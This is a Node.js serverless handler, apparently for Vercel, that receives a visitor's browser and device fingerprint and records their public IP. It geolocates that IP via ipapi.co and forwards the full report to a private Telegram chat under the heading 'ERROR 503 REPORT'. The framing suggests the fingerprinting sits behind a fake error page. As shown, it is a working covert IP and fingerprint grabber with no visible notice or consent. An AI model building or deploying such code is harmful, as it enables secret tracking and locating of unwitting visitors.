export const config = {
  runtime: "nodejs"
};


/* ==================================================
   GET PUBLIC IP
================================================== */

function getPublicIP(req) {

  let ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.headers["x-real-ip"] ||
    req.headers["cf-connecting-ip"] ||
    req.socket?.remoteAddress ||
    "";

  ip = ip.trim().replace("::ffff:", "");

  if (
    !ip ||
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    ip.startsWith("172.") ||
    ip === "127.0.0.1" ||
    ip === "::1"
  ) {
    return "Unknown";
  }

  return ip;
}


/* ==================================================
   IP INFORMATION
================================================== */

async function getIPInfo(ip) {

  if (!ip || ip === "Unknown") {

    return {
      country: "-",
      region: "-",
      city: "-",
      isp: "-"
    };

  }


  try {

    const response =
      await fetch(
        `https://ipapi.co/${encodeURIComponent(ip)}/json/`
      );


    const data =
      await response.json();


    if (data?.error) {
      throw new Error("IP API error");
    }


    return {

      country:
        data.country_name || "-",

      region:
        data.region || "-",

      city:
        data.city || "-",

      isp:
        data.org ||
        data.as ||
        "-"

    };

  } catch (error) {

    console.error(
      "IP INFO ERROR:",
      error
    );


    return {

      country: "-",
      region: "-",
      city: "-",
      isp: "-"

    };

  }

}


/* ==================================================
   SAFE TEXT
================================================== */

function value(value) {

  if (
    value === undefined ||
    value === null ||
    value === ""
  ) {

    return "-";

  }

  return String(value);

}


/* ==================================================
   HANDLER
================================================== */

export default async function handler(req, res) {

  /* Only POST */

  if (req.method !== "POST") {

    return res
      .status(405)
      .json({
        ok: false,
        error: "Method Not Allowed"
      });

  }


  /* Environment */

  const BOT_TOKEN =
    process.env.BOT_TOKEN;

  const CHAT_ID =
    process.env.CHAT_ID;


  if (!BOT_TOKEN || !CHAT_ID) {

    return res
      .status(500)
      .json({

        ok: false,

        error:
          "BOT_TOKEN atau CHAT_ID belum diset di Vercel"

      });

  }


  try {

    const input =
      req.body || {};


    /* ============================================
       SERVER INFORMATION
    ============================================ */

    const ip =
      getPublicIP(req);


    const ipinfo =
      await getIPInfo(ip);


    const serverTime =
      new Date()
        .toISOString()
        .replace("T", " ")
        .split(".")[0];


    /* ============================================
       REPORT ID
    ============================================ */

    const reportId =
      value(input.reportId);


    /* ============================================
       TELEGRAM MESSAGE
       
       Sengaja tanpa Markdown parse_mode
       supaya karakter browser/user tidak
       menyebabkan Telegram 400 Bad Request.
    ============================================ */

    const message = `🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
📋 REPORT INFORMATION
━━━━━━━━━━━━━━━━━━━━

🆔 Report ID      : ${reportId}
⏰ Server Time    : ${serverTime}
🕐 Client Time    : ${value(input.clientTime)}
🌐 Client ISO     : ${value(input.clientISO)}

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━

🧠 OS             : ${value(input.os)}
💻 Platform       : ${value(input.platform)}
⚙️ CPU Cores      : ${value(input.cpu)}
💾 RAM            : ${value(input.ram)}

━━━━━━━━━━━━━━━━━━━━
🖥 DISPLAY INFORMATION
━━━━━━━━━━━━━━━━━━━━

📐 Resolution     : ${value(input.resolution)}
📱 Viewport       : ${value(input.viewport)}
🔍 Pixel Ratio    : ${value(input.pixelRatio)}
🔄 Orientation    : ${value(input.orientation)}
👆 Touch Points   : ${value(input.touchPoints)}

━━━━━━━━━━━━━━━━━━━━
🌐 BROWSER INFORMATION
━━━━━━━━━━━━━━━━━━━━

🌍 Browser / UA:
${value(input.browser)}

🏢 Vendor         : ${value(input.vendor)}

🍪 Cookies        : ${value(input.cookies)}
📡 Online         : ${value(input.online)}
🚫 Do Not Track   : ${value(input.doNotTrack)}

━━━━━━━━━━━━━━━━━━━━
🗣 LANGUAGE & TIME
━━━━━━━━━━━━━━━━━━━━

🗣 Language       : ${value(input.language)}

🌐 Languages:
${value(input.languages)}

🌎 Timezone       : ${value(input.timezone)}

⏱ UTC Offset     : ${value(input.timezoneOffset)} minutes

━━━━━━━━━━━━━━━━━━━━
📶 CONNECTION
━━━━━━━━━━━━━━━━━━━━

📡 Type           : ${value(input.connectionType)}
📶 Effective      : ${value(input.effectiveType)}
⬇️ Downlink       : ${value(input.downlink)}
🏓 RTT            : ${value(input.rtt)}

━━━━━━━━━━━━━━━━━━━━
🌍 NETWORK
━━━━━━━━━━━━━━━━━━━━

🌐 Public IP      : ${ip}

━━━━━━━━━━━━━━━━━━━━
📍 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━

🌍 Country        : ${value(ipinfo.country)}
📍 Region         : ${value(ipinfo.region)}
🏙 City           : ${value(ipinfo.city)}
🏢 ISP / Org      : ${value(ipinfo.isp)}

━━━━━━━━━━━━━━━━━━━━
📄 PAGE INFORMATION
━━━━━━━━━━━━━━━━━━━━

🔗 Page:
${value(input.page)}

↩️ Referrer:
${value(input.referrer)}

━━━━━━━━━━━━━━━━━━━━
✅ END REPORT
━━━━━━━━━━━━━━━━━━━━`;


    /* ============================================
       SEND TELEGRAM
    ============================================ */

    const telegramResponse =
      await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

          method: "POST",

          headers: {
            "Content-Type":
              "application/json"
          },

          body: JSON.stringify({

            chat_id: CHAT_ID,

            text: message

          })

        }
      );


    const telegramText =
      await telegramResponse.text();


    console.log(
      "Telegram status:",
      telegramResponse.status
    );


    console.log(
      "Telegram response:",
      telegramText
    );


    /* ============================================
       TELEGRAM ERROR
    ============================================ */

    if (!telegramResponse.ok) {

      return res
        .status(502)
        .json({

          ok: false,

          error:
            "Telegram menolak request",

          telegram_status:
            telegramResponse.status,

          telegram_response:
            telegramText

        });

    }


    /* ============================================
       SUCCESS
    ============================================ */

    return res
      .status(200)
      .json({

        ok: true,

        message:
          "Laporan berhasil dikirim",

        reportId:
          reportId

      });


  } catch (error) {

    console.error(
      "SEND ERROR:",
      error
    );


    return res
      .status(500)
      .json({

        ok: false,

        error:
          error?.message ||
          "Internal Server Error"

      });

  }

}
